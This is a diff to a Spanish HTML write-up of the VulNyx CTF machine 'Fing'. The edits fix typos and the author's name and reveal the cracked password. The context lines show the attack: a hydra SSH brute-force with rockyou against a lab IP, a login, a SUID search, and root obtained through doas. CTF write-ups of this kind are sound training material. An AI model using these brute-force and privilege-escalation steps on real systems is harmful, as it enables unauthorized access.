@@ -2,7 +2,7 @@
 <html lang="es">
 <head>    
     <meta property="og:title" content="✍ VulNyx - Fing " />
-    <meta property="og:description" content="🧠 Creador - D4t4s3c" />
+    <meta property="og:description" content="🧠 Creador - d4t4s3c" />
     
     <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/fing" />
     <meta property="og:url" content="https://0x-noname.github.io/writeups/nyx" /> 
@@ -30,9 +30,9 @@
         </nav>
     </header>
     <main class="main">
-        <h1>Red Team & Ctf Pl4yer</h1>
+        <h1>Pentesting & Ctf Pl4yer</h1>
         <h2>VulNyx - Fing</h2>
-            <p class="autor">Autor:&nbsp;<code class="code_autor_nyx">D4t4s3c</code></p>
+            <p class="autor">Autor:&nbsp;<code class="code_autor_nyx">d4t4s3c</code></p>
             <img class="img_nyx" src="../../assets/img/nyx_fing/logo.png" alt="logo">
             <h3>Escaneo de puertos</h3>
             <pre class="pre__nyx">
@@ -99,8 +99,8 @@ adam@192.168.1.16: Login: adam    Name: adam..Directory: /home/adam    Shell: /b
             
             <p>Con hydra realizo fuerza bruta al servicio<code class="code_negrita">&nbsp;SSH&nbsp;</code>con el usuario<code class="code_negrita">&nbsp;adam</code>.</p>
 <pre class="pre__nyx">
-<code class="language-js">hydra -t 50 -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.16 -V -f -I
-[22][ssh] host: 192.168.1.16   login: adam   password: p*****n
+<code class="language-js">❯ hydra -t 50 -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.16 -V -f -I
+[22][ssh] host: 192.168.1.16   login: adam   password: passion
 </code></pre>
             <p>Me conecto al sistema como usuario Adam.</p>
 <pre class="pre__nyx"><code class="language-js">❯ ssh adam@192.168.1.16
@@ -109,7 +109,7 @@ adam@fing:~$ id
 uid=1000(adam) gid=1000(adam) grupos=1000(adam)        
 </code></pre>
 
-            <p>Busco en todo el sistema los binarios que tengan permisos<code class="code_negrita">&nbsp;SUID&nbsp;</code>y encunetro el binario doas. El binario doas es una alternativa a sudo y se puede configurar para otorgar privilegios a usuarios específicos.</p>
+            <p>Busco en todo el sistema los binarios que tengan permisos<code class="code_negrita">&nbsp;SUID&nbsp;</code>y encuentro el binario doas. El binario doas es una alternativa a sudo y se puede configurar para otorgar privilegios a usuarios específicos.</p>
 <pre class="pre__nyx"><code class="language-js">adam@fing:~$ find / -perm -4000 2>/dev/null
 /usr/bin/doas
 </code></pre>
@@ -151,7 +151,7 @@ root@fing:/home/adam# id
 uid=0(root) gid=0(root) grupos=0(root)
 </code></pre>
 
-            <p>Y con esto ya tenemos resulta la máquina Fing del sr D4t4s3c, Saludos!</p>
+            <p>Y con esto ya tenemos resuelta la máquina Fing del sr d4t4s3c, Saludos!</p>
 
     </main>
         <footer class="footer">
